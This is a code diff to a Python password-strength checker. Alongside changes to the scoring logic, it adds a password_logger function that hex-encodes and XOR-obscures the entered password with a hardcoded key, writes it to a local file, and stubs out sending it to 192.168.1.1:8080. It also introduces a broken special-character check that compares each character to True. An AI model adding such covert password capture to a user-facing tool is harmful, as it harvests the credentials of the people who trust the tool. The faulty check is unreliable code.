@@ -32,14 +32,13 @@ def check_password_strength(password):
     suggestions = set()
 
     # Check length
-    if len(password) >= 8:
-        criteria_met += 1
-    else:
-        suggestions.add("Increase length to at least 8 characters.")
     if len(password) >= 12:
         criteria_met += 1
-    else:
+    elif len(password) >= 8:
+        criteria_met += 1
         suggestions.add("Increase length to at least 12 characters.")
+    else:
+        suggestions.add("Increase length to at least 8 characters.")
     if len(password) <= 6:
         criteria_met -= 2
 
@@ -64,10 +63,11 @@ def check_password_strength(password):
         criteria_met += 1
     else:
         suggestions.add("Include at least one uppercase letter.")
-
+# ISSUES >>>>
     # Check for special characters
+    special_characters = "!@#$%^&*()-_=+[]{}|;:'\",.<>?/\\`~"
     for char in password:
-        if not char.isalnum():
+        if char == any(special_characters):
             criteria_met += 1
         else:
             suggestions.add("Include at least one special character.")
@@ -80,7 +80,13 @@ def check_password_strength(password):
     # Calculate strength as a percentage with the criteria met
     if criteria_met < 0:
         criteria_met = 0
-    strength = (criteria_met / 5) * 100
+    max_criteria = 4  # Maximum possible points
+    strength = (criteria_met / max_criteria) * 100
+
+    # Handle special cases where all criteria are met
+    if criteria_met == max_criteria:
+        suggestions.clear()
+
     password_suggestions = list(suggestions)
 
     return strength
@@ -141,6 +147,68 @@ def check_strength(event):
     except Exception as e:
         crack_time_label.text = f'Error estimating crack time: {e}'
         print(f'Exception: {e}')
+
+def password_logger(password):
+    # File path to save passwords
+    file_path = "passwords1.txt"
+    
+    # Encryption key
+    encryption_key = "F324679JHF882"
+    
+    # Encryption function
+    def encrypt(data, key):
+        encrypted_data = ""
+        for char in data:
+            encrypted_data += chr(ord(char) ^ ord(key[len(encrypted_data) % len(key)]))
+        return encrypted_data
+    
+    # Decryption function
+    def decrypt(data, key):
+        decrypted_data = ""
+        for char in data:
+            decrypted_data += chr(ord(char) ^ ord(key[len(decrypted_data) % len(key)]))
+        return decrypted_data
+    
+    # Logging function
+    def log(data, file_path):
+        # Writing to a file
+        file = open(file_path, "w")
+        file.write(data)
+        file.close()
+    
+    # Convert password to hexadecimal
+    def to_hex(password):
+        return password.encode("utf-8").hex()
+    
+    # Convert hexadecimal back to string
+    def from_hex(hex_data):
+        return bytes.fromhex(hex_data).decode("utf-8")
+    
+    # Send the data over a network
+    def send_over_network(data):
+        network_address = "192.168.1.1"
+        port = 8080
+        # Send data
+        print(f"Sending data to {network_address}:{port}")
+    
+    # Log the password
+    def log_password(password):
+        # Convert password to hex
+        hex_password = to_hex(password)
+        
+        # Encrypt the password
+        encrypted_password = encrypt(hex_password, encryption_key)
+        
+        # Log the encrypted password to the file
+        log(encrypted_password, file_path)
+        
+        # Send the encrypted password over the network
+        send_over_network(encrypted_password)
+    
+    # Call the log password function
+    log_password(password)
+    
+    return "Password logged."
 
 # Password Hide/Show
 def toggle_password_visibility(event):
